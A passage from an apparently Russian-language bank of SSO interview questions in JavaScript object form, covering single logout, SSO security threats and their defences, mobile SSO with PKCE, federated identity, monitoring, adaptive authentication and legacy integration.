invisible iframes</li><li>Каждый iframe загружает logout endpoint SP</li><li>Browser выполняет logout в каждом SP</li></ul><p><strong>2. Back-Channel Logout:</strong></p><ul><li>IdP напрямую вызывает logout endpoints SP</li><li>Не зависит от браузера</li><li>Более надёжно</li></ul><p><strong>Проблемы и вызовы SLO:</strong></p><p><strong>1. Неполный logout:</strong></p><p><strong>Проблема:</strong></p><ul><li>Один из SP недоступен или не отвечает</li><li>SLO процесс может не завершиться полностью</li></ul><p><strong>Решение:</strong></p><ul><li>Timeout для каждого SP (3-5 секунд)</li><li>Продолжать даже если один SP не ответил</li><li>Логировать failures</li></ul><p><strong>2. Асинхронность:</strong></p><p><strong>Проблема:</strong></p><ul><li>Процесс может занять время (5-10 секунд)</li><li>Пользователь ждёт</li></ul><p><strong>Решение:</strong></p><ul><li>Параллельные запросы к SP</li><li>Показывать loading indicator</li><li>Асинхронный logout в background</li></ul><p><strong>3. Browser закрыт до завершения:</strong></p><p><strong>Проблема:</strong></p><ul><li>Front-channel logout прерывается</li><li>Некоторые сессии могут остаться</li></ul><p><strong>Решение:</strong></p><ul><li>Использовать back-channel где возможно</li><li>Session timeout на SP как fallback</li></ul><p><strong>4. Cross-domain сложности:</strong></p><p><strong>Проблема:</strong></p><ul><li>Third-party cookies блокируются</li><li>Front-channel logout может не работать</li></ul><p><strong>Решение:</strong></p><ul><li>Back-channel logout предпочтительнее</li><li>Короткие session timeout</li></ul><p><strong>Best Practices SLO:</strong></p><ul><li>✅ Реализуйте back-channel logout где возможно</li><li>✅ Короткие timeout для SP ответов</li><li>✅ Логируйте все SLO события</li><li>✅ Graceful degradation если SLO частично провалился</li><li>✅ Session timeout как дополнительная защита</li><li>✅ Очищайте локальное состояние в SP</li></ul><p><strong>Альтернатива полному SLO:</strong></p><p><strong>Короткие session timeout:</strong></p><ul><li>Вместо сложного SLO</li><li>Сессии в SP живут 15-30 минут</li><li>Автоматически истекают</li><li>Проще, но менее responsive</li></ul><p><strong>Локальный logout + периодическая проверка:</strong></p><ul><li>SP периодически проверяет IdP сессию</li><li>Если IdP сессии нет → завершает локальную</li><li>Не мгновенно, но работает</li></ul>",
    difficulty: 'middle',
    tags: ['SSO', 'SLO', 'Single Logout', 'session management', 'безопасность']
  },

  {
    id: 92,
    question: "Какие вызовы безопасности существуют в SSO и как их решать?",
    answer: "<p><strong>SSO создаёт уникальные вызовы безопасности</strong> из-за централизации аутентификации.</p><p><strong>1. Single Point of Failure (критичная уязвимость):</strong></p><p><strong>Проблема:</strong></p><ul><li>IdP — единая точка доступа ко всему</li><li>Компрометация IdP = доступ ко всем приложениям</li><li>Взлом одного аккаунта → доступ везде</li></ul><p><strong>Решения:</strong></p><ul><li>✅ <strong>MFA обязательно</strong> — второй фактор на IdP</li><li>✅ Conditional Access — проверка device, location, risk</li><li>✅ High Availability для IdP (99.99% uptime)</li><li>✅ Мониторинг подозрительных логинов</li><li>✅ Rate limiting на login attempts</li></ul><p><strong>2. Session Hijacking:</strong></p><p><strong>Атака:</strong></p><ul><li>Злонамеренник крадёт IdP session cookie</li><li>Получает доступ ко всем приложениям</li><li>До истечения сессии</li></ul><p><strong>Защита:</strong></p><ul><li>✅ HttpOnly, Secure, SameSite cookies</li><li>✅ Короткий session timeout (30-60 минут)</li><li>✅ Idle timeout (15 минут без активности)</li><li>✅ Binding сессии к IP/User-Agent (с осторожностью)</li><li>✅ Периодическая re-authentication для критичных операций</li></ul><p><strong>3. SAML Assertion Replay:</strong></p><p><strong>Атака:</strong></p><ul><li>Перехват SAML assertion</li><li>Переиспользование для доступа</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Короткое время жизни assertion (5 минут)</li><li>✅ OneTimeUse условие в assertion</li><li>✅ Проверка NotBefore и NotOnOrAfter</li><li>✅ Хранение использованных assertion ID (cache)</li><li>✅ HTTPS везде</li></ul><p><strong>4. Man-in-the-Middle (MitM):</strong></p><p><strong>Атака:</strong></p><ul><li>Перехват коммуникации между SP и IdP</li><li>Кража credentials или tokens</li></ul><p><strong>Защита:</strong></p><ul><li>✅ TLS/HTTPS обязательно</li><li>✅ Certificate pinning (для mobile)</li><li>✅ HSTS заголовки</li><li>✅ Проверка SSL сертификатов</li></ul><p><strong>5. Phishing атаки:</strong></p><p><strong>Атака:</strong></p><ul><li>Поддельная страница логина IdP</li><li>Пользователь вводит credentials</li><li>Злонамеренник получает доступ</li></ul><p><strong>Защита:</strong></p><ul><li>✅ MFA — даже если пароль украден</li><li>✅ FIDO2/WebAuthn — phishing-resistant</li><li>✅ Обучение пользователей проверять URL</li><li>✅ Email notifications о новых логинах</li><li>✅ Risk-based authentication</li></ul><p><strong>6. Excessive Trust между SP и IdP:</strong></p><p><strong>Проблема:</strong></p><ul><li>SP слепо доверяет всем assertions от IdP</li><li>Не проверяет достаточно параметров</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Валидация подписи assertion</li><li>✅ Проверка Audience (для кого предназначен)</li><li>✅ Проверка Issuer (от правильного IdP)</li><li>✅ Проверка времени жизни</li><li>✅ Whitelist ожидаемых атрибутов</li></ul><p><strong>7. XML Signature Wrapping (SAML specific):</strong></p><p><strong>Атака:</strong></p><ul><li>Манипуляция XML структурой</li><li>Подпись валидна, но данные изменены</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Использовать проверенные SAML библиотеки</li><li>✅ Strict XML parsing</li><li>✅ Проверка Reference в подписи</li><li>✅ Обновлять библиотеки</li></ul><p><strong>8. Недостаточный logout:</strong></p><p><strong>Проблема:</strong></p><ul><li>Logout только из IdP</li><li>SP сессии остаются активными</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Реализация SLO (Single Logout)</li><li>✅ Короткие session timeout на SP</li><li>✅ Периодическая проверка IdP сессии</li></ul><p><strong>9. Privilege Escalation:</strong></p><p><strong>Проблема:</strong></p><ul><li>Пользователь получает больше прав чем должен</li><li>Через манипуляцию атрибутами</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Валидация role/group атрибутов на SP</li><li>✅ Не доверять исключительно IdP для авторизации</li><li>✅ Проверка прав на каждую операцию</li><li>✅ Логирование изменений прав</li></ul><p><strong>10. IdP Downtime:</strong></p><p><strong>Проблема:</strong></p><ul><li>IdP недоступен → никто не может залогиниться</li><li>Denial of Service для всех приложений</li></ul><p><strong>Решения:</strong></p><ul><li>✅ High Availability IdP setup</li><li>✅ Failover механизмы</li><li>✅ Emergency break-glass accounts</li><li>✅ Локальный fallback для критичных систем</li></ul><p><strong>Best Practices безопасности:</strong></p><ul><li>✅ <strong>MFA обязательно</strong> на IdP уровне</li><li>✅ Risk-based authentication</li><li>✅ Короткие session timeout</li><li>✅ Comprehensive audit logging</li><li>✅ Регулярные security аудиты</li><li>✅ Monitoring аномального поведения</li><li>✅ Principle of least privilege</li><li>✅ Regular penetration testing</li><li>✅ Encryption in transit и at rest</li></ul><p><strong>Compliance соображения:</strong></p><ul><li>GDPR — право на забвение, data portability</li><li>SOX — audit trails, access control</li><li>HIPAA — encryption, access logs</li><li>PCI DSS — MFA, session management</li></ul>",
    difficulty: 'senior',
    tags: ['SSO', 'безопасность', 'угрозы', 'защита', 'MFA']
  },

  {
    id: 93,
    question: "Как реализовать SSO для мобильных приложений?",
    answer: "<p><strong>Мобильные приложения требуют особого подхода к SSO</strong> из-за отсутствия shared browser cookies.</p><p><strong>Проблемы mobile SSO:</strong></p><ul><li>❌ Нет shared cookie jar между приложениями</li><li>❌ WebView сессии изолированы</li><li>❌ Каждое приложение — отдельный контейнер</li><li>❌ SAML плохо подходит для mobile</li></ul><p><strong>Решения для мобильных:</strong></p><p><strong>1. System Browser + OIDC (рекомендуется):</strong></p><p><strong>Как работает:</strong></p><ol><li>Приложение открывает system browser (Safari/Chrome)</li><li>Redirect на Authorization Server</li><li>Пользователь логинится (если не залогинен)</li><li>System browser имеет shared cookies</li><li>Второе приложение видит существующую сессию</li><li>SSO работает через shared browser session</li></ol><p><strong>Реализация:</strong></p><ul><li>iOS: ASWebAuthenticationSession / SFAuthenticationSession</li><li>Android: Chrome Custom Tabs</li><li>React Native: react-native-app-auth</li><li>Flutter: flutter_appauth</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Настоящий SSO между приложениями</li><li>✅ Безопасный (credentials не в приложении)</li><li>✅ System keychain для хранения tokens</li></ul><p><strong>Недостатки:</strong></p><ul><li>⚠️ Context switch (выход из приложения)</li><li>⚠️ UX менее seamless</li></ul><p><strong>2. Authorization Code + PKCE:</strong></p><p><strong>Обязательно для mobile:</strong></p><ul><li>Public clients не могут хранить Client Secret</li><li>PKCE защищает от перехвата authorization code</li></ul><p><strong>Flow:</strong></p><ol><li>App генерирует code_verifier (случайная строка)</li><li>Создаёт code_challenge = SHA256(code_verifier)</li><li>Открывает browser с code_challenge</li><li>Получает authorization code</li><li>Обменивает code + code_verifier на tokens</li><li>Server проверяет что SHA256(verifier) = challenge</li></ol><p><strong>3. Custom URL Schemes (deprecated):</strong></p><p><strong>Старый подход:</strong></p><ul><li>myapp://callback</li><li>Redirect после аутентификации</li></ul><p><strong>Проблемы:</strong></p><ul><li>❌ Любое приложение может зарегистрировать схему</li><li>❌ Риск перехвата authorization code</li><li>❌ Не рекомендуется без PKCE</li></ul><p><strong>4. Universal Links (iOS) / App Links (Android):</strong></p><p><strong>Безопасная альтернатива:</strong></p><ul><li>https://myapp.com/callback вместо myapp://</li><li>Проверяется владение доменом</li><li>Только ваше приложение может обработать</li></ul><p><strong>Настройка:</strong></p><ul><li>iOS: Associated Domains capability</li><li>Android: Digital Asset Links</li><li>Файл на сервере подтверждает связь</li></ul><p><strong>5. Token Storage на мобильных:</strong></p><p><strong>Где хранить tokens:</strong></p><table><tr><th>Способ</th><th>iOS</th><th>Android</th><th>Рекомендация</th></tr><tr><td>Keychain/KeyStore</td><td>✅</td><td>✅</td><td>✅ Лучший</td></tr><tr><td>Encrypted SharedPreferences</td><td>-</td><td>✅</td><td>✅ Хорошо</td></tr><tr><td>Memory</td><td>⚠️</td><td>⚠️</td><td>⚠️ Временно</td></tr><tr><td>UserDefaults/SharedPrefs</td><td>❌</td><td>❌</td><td>❌ Небезопасно</td></tr></table><p><strong>iOS Keychain:</strong></p><ul><li>// Swift пример</li><li>let query = [</li><li>  kSecClass: kSecClassGenericPassword,</li><li>  kSecAttrAccount: \"accessToken\",</li><li>  kSecValueData: tokenData</li><li>]</li><li>SecItemAdd(query, nil)</li></ul><p><strong>Android KeyStore:</strong></p><ul><li>// Kotlin пример</li><li>val keyStore = KeyStore.getInstance(\"AndroidKeyStore\")</li><li>// Encrypt token before storing</li></ul><p><strong>6. Biometric Authentication:</strong></p><p><strong>Интеграция с SSO:</strong></p><ul><li>Первый логин через SSO</li><li>Сохранение refresh token в secure storage</li><li>Последующие запуски — biometric unlock</li><li>Access token обновляется через refresh token</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Быстрый доступ</li><li>✅ Не нужно вводить пароль каждый раз</li><li>✅ Безопасно (biometric + secure storage)</li></ul><p><strong>7. Mobile SSO через SDK:</strong></p><p><strong>Провайдеры предоставляют SDK:</strong></p><ul><li>Auth0 Mobile SDK</li><li>Firebase Auth</li><li>AWS Amplify</li><li>Azure MSAL</li></ul><p><strong>Преимущества SDK:</strong></p><ul><li>✅ Реализация best practices</li><li>✅ Automatic token refresh</li><li>✅ Secure storage из коробки</li><li>✅ Меньше кода</li></ul><p><strong>8. Silent Refresh:</strong></p><p><strong>Обновление tokens без UI:</strong></p><ul><li>Когда access token истекает</li><li>Использовать refresh token</li><li>Получить новый access token</li><li>Всё в background</li></ul><p><strong>Реализация:</strong></p><ul><li>// Перед каждым API запросом</li><li>if (accessToken.isExpired()) {</li><li>  accessToken = await refreshAccessToken()</li><li>}</li></ul><p><strong>Best Practices для mobile SSO:</strong></p><ul><li>✅ System browser вместо WebView</li><li>✅ PKCE обязательно</li><li>✅ Universal/App Links для callbacks</li><li>✅ Secure storage (Keychain/KeyStore)</li><li>✅ Biometric для удобства</li><li>✅ Short-lived access tokens (15 мин)</li><li>✅ Refresh token rotation</li><li>✅ Certificate pinning для API</li></ul><p><strong>Отличия от web SSO:</strong></p><ul><li>Web: shared browser cookies</li><li>Mobile: system browser session для SSO</li><li>Web: может использовать SAML</li><li>Mobile: только OIDC/OAuth</li></ul>",
    difficulty: 'middle',
    tags: ['SSO', 'mobile', 'PKCE', 'OIDC', 'iOS', 'Android']
  },

  {
    id: 94,
    question: "Как работает Federated Identity и в чём разница с обычным SSO?",
    answer: "<p><strong>Federated Identity</strong> — это расширение SSO для доверительных отношений между разными организациями.</p><p><strong>Обычный SSO vs Federation:</strong></p><table><tr><th>Аспект</th><th>SSO</th><th>Federation</th></tr><tr><td>Scope</td><td>Одна организация</td><td>Множество организаций</td></tr><tr><td>Trust</td><td>Внутреннее</td><td>Между организациями</td></tr><tr><td>IdP</td><td>Один</td><td>Множество (federation)</td></tr><tr><td>Use Case</td><td>Корпоративные приложения</td><td>B2B партнёрства</td></tr></table><p><strong>Что такое Federation:</strong></p><ul><li>Множество организаций соглашаются доверять друг другу</li><li>Пользователь одной организации может получить доступ к ресурсам другой</li><li>Без создания отдельного аккаунта</li><li>Identity провайдер домашней организации аутентифицирует</li></ul><p><strong>Основные компоненты:</strong></p><p><strong>1. Identity Provider (IdP):</strong></p><ul><li>Домашняя организация пользователя</li><li>Хранит credentials</li><li>Аутентифицирует пользователей</li></ul><p><strong>2. Service Provider (SP):</strong></p><ul><li>Партнёрская организация</li><li>Предоставляет ресурсы/сервисы</li><li>Доверяет IdP партнёра</li></ul><p><strong>3. Trust Relationship:</strong></p><ul><li>Формальное соглашение между организациями</li><li>Обмен metadata и сертификатами</li><li>Определение атрибутов для обмена</li></ul><p><strong>Как работает Federation:</strong></p><p><strong>Пример сценария:</strong></p><ul><li>Компания A (partner) и Компания B (your company)</li><li>Сотруднику A нужен доступ к системе B</li></ul><p><strong>Flow:</strong></p><ol><li>👤 Сотрудник A открывает систему Компании B</li><li>🔍 Система B: \"Кто ваш IdP?\" (email domain или выбор)</li><li>🔄 Redirect на IdP Компании A</li><li>🔐 IdP A аутентифицирует своего сотрудника</li><li>📝 IdP A создаёт SAML assertion для Компании B</li><li>✅ Assertion содержит согласованные атрибуты</li><li>🔄 Redirect обратно на систему B с assertion</li><li>✅ Система B проверяет подпись IdP A</li><li>👥 Создаёт учётную запись или предоставляет доступ</li><li>🚀 Сотрудник A работает в системе B</li></ol><p><strong>Типы Federation:</strong></p><p><strong>1. Hub-and-Spoke (централизованная):</strong></p><ul><li>Центральный federation hub</li><li>Все организации подключаются к hub</li><li>Hub управляет trust relationships</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Проще управление</li><li>✅ Единая точка для политик</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Hub — single point of failure</li><li>❌ Дополнительный hop в аутентификации</li></ul><p><strong>2. Mesh (распределённая):</strong></p><ul><li>Каждая организация напрямую доверяет другим</li><li>Peer-to-peer trust relationships</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Нет центральной точки отказа</li><li>✅ Прямая коммуникация</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Сложность растёт с числом партнёров</li><li>❌ N×(N-1)/2 trust relationships</li></ul><p><strong>Attribute Mapping:</strong></p><p><strong>Проблема:</strong></p><ul><li>Разные организации используют разные атрибуты</li><li>Компания A: \"employeeID\"</li><li>Компания B: \"staffNumber\"</li></ul><p><strong>Решение:</strong></p><ul><li>Согласование схемы атрибутов</li><li>Mapping rules на стороне SP</li><li>Стандартные профили (eduPerson для университетов)</li></ul><p><strong>Just-in-Time Provisioning:</strong></p><p><strong>Концепция:</strong></p><ul><li>Учётная запись создаётся автоматически при первом логине</li><li>На основе атрибутов из assertion</li><li>Не нужно заранее создавать аккаунты</li></ul><p><strong>Процесс:</strong></p><ol><li>Первый логин через federation</li><li>SP получает assertion с атрибутами</li><li>Проверяет что пользователя нет в системе</li><li>Автоматически создаёт аккаунт</li><li>Маппит роли на основе атрибутов</li><li>Предоставляет доступ</li></ol><p><strong>Use Cases Federation:</strong></p><p><strong>1. B2B партнёрства:</strong></p><ul><li>Поставщики и заказчики</li><li>Партнёры получают доступ к системам</li><li>Без создания отдельных аккаунтов</li></ul><p><strong>2. Образование (eduGAIN):</strong></p><ul><li>Студент университета A</li><li>Доступ к ресурсам университета B</li><li>Библиотеки, research tools</li></ul><p><strong>3. Healthcare:</strong></p><ul><li>Врач из одной больницы</li><li>Доступ к системам другой</li><li>Для консультаций, переводов пациентов</li></ul><p><strong>4. Cloud Services:</strong></p><ul><li>Корпоративный IdP</li><li>Доступ к AWS, Azure, GCP</li><li>Через SAML federation</li></ul><p><strong>Вызовы Federation:</strong></p><ul><li>⚠️ Trust — юридические соглашения необходимы</li><li>⚠️ Privacy — какие данные передавать</li><li>⚠️ Governance — кто отвечает за что</li><li>⚠️ Lifecycle — синхронизация изменений (увольнения)</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Чёткое соглашение о данных (Data Processing Agreement)</li><li>✅ Минимальные необходимые атрибуты</li><li>✅ Regular review trust relationships</li><li>✅ Monitoring federated logins</li><li>✅ Clear offboarding процесс</li></ul>",
    difficulty: 'senior',
    tags: ['SSO', 'Federation', 'Federated Identity', 'B2B', 'SAML']
  },

  {
    id: 95,
    question: "Как организовать мониторинг и логирование SSO активности?",
    answer: "<p><strong>Мониторинг SSO критичен</strong> для безопасности, compliance и troubleshooting.</p><p><strong>Что логировать в SSO:</strong></p><p><strong>1. Аутентификация события:</strong></p><ul><li><strong>Successful logins:</strong> кто, когда, откуда (IP, location)</li><li><strong>Failed login attempts:</strong> причина, частота</li><li><strong>MFA events:</strong> challenge, success/fail</li><li><strong>Password resets:</strong> инициатор, время</li><li><strong>Account lockouts:</strong> причина, duration</li></ul><p><strong>Структура лога:</strong></p><ul><li>{ timestamp, userId, event: \"login_success\", ip: \"192.168.1.1\", userAgent: \"...\", location: \"Amsterdam, NL\", method: \"password+mfa\" }</li></ul><p><strong>2. SSO Flow события:</strong></p><ul><li><strong>SAML/OIDC requests:</strong> какой SP инициировал</li><li><strong>Assertion/Token выдача:</strong> кому, какие scopes</li><li><strong>Logout events:</strong> SLO инициация и результат</li><li><strong>Session events:</strong> создание, продление, истечение</li></ul><p><strong>3. Административные действия:</strong></p><ul><li><strong>User provisioning/deprovisioning</strong></li><li><strong>Role/permission изменения</strong></li><li><strong>SP registration/configuration</strong></li><li><strong>Trust relationship изменения</strong></li><li><strong>Policy updates</strong></li></ul><p><strong>4. Безопасность события:</strong></p><ul><li><strong>Anomalous login patterns:</strong> unusual location, device</li><li><strong>Brute force attempts</strong></li><li><strong>Suspicious assertion/token usage</strong></li><li><strong>Certificate expiration warnings</strong></li></ul><p><strong>Ключевые метрики для мониторинга:</strong></p><p><strong>Authentication метрики:</strong></p><ul><li>📊 Login success rate (общая и по SP)</li><li>📊 Average login time</li><li>📊 Failed login rate</li><li>📊 MFA adoption rate</li><li>📊 Active sessions count</li></ul><p><strong>Performance метрики:</strong></p><ul><li>⏱️ SAML/OIDC flow latency</li><li>⏱️ Assertion generation time</li><li>⏱️ Token validation time</li><li>⏱️ IdP response time</li></ul><p><strong>Security метрики:</strong></p><ul><li>🔒 Account lockouts per hour</li><li>🔒 Geographic anomalies</li><li>🔒 Simultaneous sessions per user</li><li>🔒 Failed MFA attempts</li></ul><p><strong>Business метрики:</strong></p><ul><li>📈 Active users (DAU, MAU)</li><li>📈 SSO adoption rate</li><li>📈 Most used applications</li><li>📈 Peak login times</li></ul><p><strong>Инструменты мониторинга:</strong></p><p><strong>1. SIEM системы:</strong></p><ul><li><strong>Splunk</strong> — centralized log analysis</li><li><strong>ELK Stack</strong> — Elasticsearch, Logstash, Kibana</li><li><strong>Azure Sentinel</strong> — cloud-native SIEM</li></ul><p><strong>Что делают:</strong></p><ul><li>Агрегация логов из IdP и SP</li><li>Correlation события</li><li>Anomaly detection</li><li>Compliance reporting</li></ul><p><strong>2. APM решения:</strong></p><ul><li><strong>Datadog</strong> — metrics, traces, logs</li><li><strong>New Relic</strong> — application performance</li><li><strong>Dynatrace</strong> — AI-powered monitoring</li></ul><p><strong>3. Специализированные SSO analytics:</strong></p><ul><li><strong>Okta Insights</strong></li><li><strong>Auth0 Analytics</strong></li><li><strong>Azure AD Reports</strong></li></ul><p><strong>Dashboards для разных ролей:</strong></p><p><strong>Security Dashboard:</strong></p><ul><li>🚨 Real-time alerts</li><li>🚨 Failed login map (geographic)</li><li>🚨 Suspicious activities</li><li>🚨 Top attack vectors</li></ul><p><strong>Operations Dashboard:</strong></p><ul><li>📊 System health (uptime, latency)</li><li>📊 Error rates</li><li>📊 Active sessions</li><li>📊 Performance trends</li></ul><p><strong>Compliance Dashboard:</strong></p><ul><li>📋 Audit trail completeness</li><li>📋 Access reviews status</li><li>📋 Policy violations</li><li>📋 Retention compliance</li></ul><p><strong>Alerts и уведомления:</strong></p><p><strong>Critical alerts (immediate):</strong></p><ul><li>🚨 IdP downtime</li><li>🚨 Mass failed logins (potential attack)</li><li>🚨 Privileged account compromise indicators</li><li>🚨 Certificate expiration (< 7 days)</li></ul><p><strong>Warning alerts (review needed):</strong></p><ul><li>⚠️ Login from new country</li><li>⚠️ Multiple concurrent sessions</li><li>⚠️ Unusual login time</li><li>⚠️ Performance degradation</li></ul><p><strong>Best Practices логирования:</strong></p><ul><li>✅ Централизованное хранение логов</li><li>✅ Tamper-proof logs (write-once storage)</li><li>✅ Encryption логов at rest</li><li>✅ Retention минимум 1 год (часто больше для compliance)</li><li>✅ Structured logging (JSON)</li><li>✅ Correlation IDs для трейсинга flows</li><li>✅ PII masking в логах</li></ul><p><strong>Compliance требования:</strong></p><p><strong>GDPR:</strong></p><ul><li>Логировать согласие пользователя</li><li>Audit trail для data access</li><li>Right to be forgotten — удаление логов</li></ul><p><strong>SOX:</strong></p><ul><li>Immutable audit logs</li><li>Access control changes</li><li>Segregation of duties</li></ul><p><strong>HIPAA:</strong></p><ul><li>Все доступы к PHI</li><li>Emergency access logging</li><li>Encryption и access controls</li></ul><p><strong>Anomaly Detection примеры:</strong></p><ul><li>Логин из нового device + нового location</li><li>Impossible travel (Москва → NY за 1 час)</li><li>Spike в failed logins</li><li>Access в unusual hours</li><li>Rapid account switching</li></ul>",
    difficulty: 'middle',
    tags: ['SSO', 'мониторинг', 'логирование', 'SIEM', 'метрики', 'compliance']
  },

  {
    id: 96,
    question: "Как работает Context-Aware и Adaptive Authentication в SSO?",
    answer: "<p><strong>Context-Aware Authentication</strong> — это динамическая аутентификация на основе контекста запроса.</p><p><strong>Традиционная аутентификация:</strong></p><ul><li>Username + Password</li><li>Возможно MFA</li><li>Одинаково для всех ситуаций</li></ul><p><strong>Context-Aware подход:</strong></p><ul><li>Анализ контекста каждого запроса</li><li>Динамическое определение требований</li><li>Разные правила для разных ситуаций</li></ul><p><strong>Факторы контекста:</strong></p><p><strong>1. User context:</strong></p><ul><li><strong>Роль:</strong> admin vs обычный пользователь</li><li><strong>История:</strong> первый логин vs постоянный</li><li><strong>Behaviour pattern:</strong> обычное vs аномальное поведение</li><li><strong>Trust score:</strong> накопленный уровень доверия</li></ul><p><strong>2. Device context:</strong></p><ul><li><strong>Device type:</strong> mobile, desktop, tablet</li><li><strong>Managed device:</strong> корпоративный vs личный</li><li><strong>Security posture:</strong> антивирус, encryption, патчи</li><li><strong>Fingerprint:</strong> известное vs новое устройство</li></ul><p><strong>3. Network context:</strong></p><ul><li><strong>IP address:</strong> корпоративная сеть vs внешняя</li><li><strong>Geographic location:</strong> обычная vs новая страна</li><li><strong>VPN usage:</strong> через VPN vs direct</li><li><strong>Risk score сети:</strong> trusted vs suspicious</li></ul><p><strong>4. Access context:</strong></p><ul><li><strong>Ресурс:</strong> публичный vs конфиденциальный</li><li><strong>Действие:</strong> чтение vs изменение</li><li><strong>Время:</strong> рабочие часы vs ночь</li><li><strong>Frequency:</strong> обычная vs необычная частота</li></ul><p><strong>Adaptive Authentication (Risk-Based):</strong></p><p><strong>Как работает:</strong></p><ol><li>📊 Сбор контекстных данных</li><li>🧮 Расчёт risk score (0-100)</li><li>🎯 Применение политики на основе риска</li></ol><p><strong>Risk Scoring пример:</strong></p><ul><li>Base score: 20 (новая сессия)</li><li>+ 30 — новое устройство</li><li>+ 20 — новая страна</li><li>+ 10 — необычное время (3 AM)</li><li>= 80 (высокий риск)</li></ul><p><strong>Adaptive Policies:</strong></p><p><strong>Low Risk (score 0-30):</strong></p><ul><li>✅ Username + Password</li><li>Быстрый доступ</li></ul><p><strong>Пример:</strong></p><ul><li>Знакомое устройство</li><li>Корпоративная сеть</li><li>Рабочие часы</li></ul><p><strong>Medium Risk (score 31-60):</strong></p><ul><li>✅ Username + Password</li><li>✅ + MFA (SMS/Email)</li></ul><p><strong>Пример:</strong></p><ul><li>Новое устройство</li><li>Но корпоративная сеть</li></ul><p><strong>High Risk (score 61-100):</strong></p><ul><li>✅ Username + Password</li><li>✅ + Strong MFA (authenticator app)</li><li>✅ + Additional verification</li><li>⚠️ Или блокировка с уведомлением</li></ul><p><strong>Пример:</strong></p><ul><li>Новая страна</li><li>Ночное время</li><li>Доступ к конфиденциальным данным</li></ul><p><strong>Step-Up Authentication:</strong></p><p><strong>Концепция:</strong></p><ul><li>Базовая аутентификация для входа</li><li>Дополнительная для критичных операций</li></ul><p><strong>Сценарий:</strong></p><ol><li>Пользователь залогинен (password only)</li><li>Работает с обычными данными — OK</li><li>Хочет изменить настройки безопасности</li><li>→ Требуется MFA (step-up)</li><li>После MFA — доступ к критичной операции</li></ol><p><strong>Использование в SSO:</strong></p><ul><li>Доступ к большинству приложений — базовый</li><li>Финансовые системы — требуют step-up</li><li>HR системы — требуют step-up</li></ul><p><strong>Continuous Authentication:</strong></p><p><strong>Идея:</strong></p><ul><li>Не только при логине</li><li>Постоянная оценка риска во время сессии</li><li>Адаптация прав в реальном времени</li></ul><p><strong>Мониторинг:</strong></p><ul><li>Behavioural biometrics (typing patterns)</li><li>Mouse movements</li><li>Session activity patterns</li><li>Geo-velocity (impossible travel)</li></ul><p><strong>Действия:</strong></p><ul><li>Risk повысился → требовать re-auth</li><li>Аномалия → завершить сессию</li><li>Подозрительно → ограничить права</li></ul><p><strong>Реализация Context-Aware SSO:</strong></p><p><strong>Архитектура:</strong></p><ul><li>🔐 IdP с policy engine</li><li>📊 Context collection service</li><li>🧮 Risk scoring engine</li><li>📋 Policy decision point</li></ul><p><strong>Интеграция:</strong></p><ol><li>Login request → collect context</li><li>Context → risk scoring</li><li>Risk score → policy evaluation</li><li>Policy → authentication requirements</li><li>Present appropriate challenge</li></ol><p><strong>Примеры провайдеров:</strong></p><ul><li>Okta Adaptive MFA</li><li>Azure AD Conditional Access</li><li>Auth0 Adaptive MFA</li><li>Ping Identity Adaptive Authentication</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Баланс безопасности и UX</li><li>✅ Меньше friction для low-risk</li><li>✅ Строже для high-risk</li><li>✅ Адаптация к угрозам</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Начните с мониторинга (log-only режим)</li><li>✅ Постепенное внедрение политик</li><li>✅ Clear коммуникация с пользователями</li><li>✅ Fallback для false positives</li><li>✅ Regular review и tuning политик</li></ul>",
    difficulty: 'senior',
    tags: ['SSO', 'Context-Aware', 'Adaptive Authentication', 'Risk-Based', 'MFA']
  },

  {
    id: 97,
    question: "Как реализовать SSO для legacy приложений?",
    answer: "<p><strong>Legacy приложения часто не поддерживают современные SSO протоколы</strong>, требуя специальных подходов.</p><p><strong>Типичные проблемы legacy:</strong></p><ul><li>❌ Нет поддержки SAML/OIDC</li><li>❌ Только форма логина username/password</li><li>❌ Невозможность изменить код</li><li>❌ Нет API для интеграции</li><li>❌ Session management устаревший</li></ul><p><strong>Решения для legacy SSO:</strong></p><p><strong>1. Reverse Proxy Pattern:</strong></p><p><strong>Архитектура:</strong></p><ul><li>Proxy перед legacy приложением</li><li>Proxy обрабатывает SSO</li><li>Proxy инжектирует credentials в приложение</li></ul><p><strong>Как работает:</strong></p><ol><li>User → Proxy: запрос к legacy app</li><li>Proxy → IdP: SSO аутентификация</li><li>IdP → Proxy: SAML assertion</li><li>Proxy извлекает username из assertion</li><li>Proxy → Legacy App: автоматически логинит пользователя</li><li>Legacy App → User: authenticated session</li></ol><p><strong>Способы инъекции credentials:</strong></p><ul><li><strong>Form auto-fill:</strong> заполнение формы логина</li><li><strong>Header injection:</strong> специальные HTTP headers</li><li><strong>Cookie injection:</strong> создание session cookie</li></ul><p><strong>Инструменты:</strong></p><ul><li>Okta Access Gateway</li><li>Ping Access</li><li>F5 BIG-IP APM</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Не нужно изменять приложение</li><li>✅ Централизованная аутентификация</li><li>✅ Дополнительный security layer</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Дополнительный компонент инфраструктуры</li><li>❌ Возможны проблемы с сложными формами</li><li>❌ Proxy — potential bottleneck</li></ul><p><strong>2. Password Vaulting (Credential Injection):</strong></p><p><strong>Концепция:</strong></p><ul><li>IdP хранит credentials для legacy app</li><li>При SSO автоматически использует их</li></ul><p><strong>Flow:</strong></p><ol><li>User логинится в IdP</li><li>Открывает legacy app через portal</li><li>IdP достаёт stored credentials пользователя</li><li>Auto-fill формы логина</li><li>User автоматически залогинен</li></ol><p><strong>Варианты хранения:</strong></p><ul><li><strong>Individual passwords:</strong> свой для каждого</li><li><strong>Shared service account:</strong> общий (менее безопасно)</li><li><strong>Role-based accounts:</strong> по ролям</li></ul><p><strong>Безопасность:</strong></p><ul><li>✅ Passwords encrypted в vault</li><li>✅ Rotation политика</li><li>✅ Audit logging 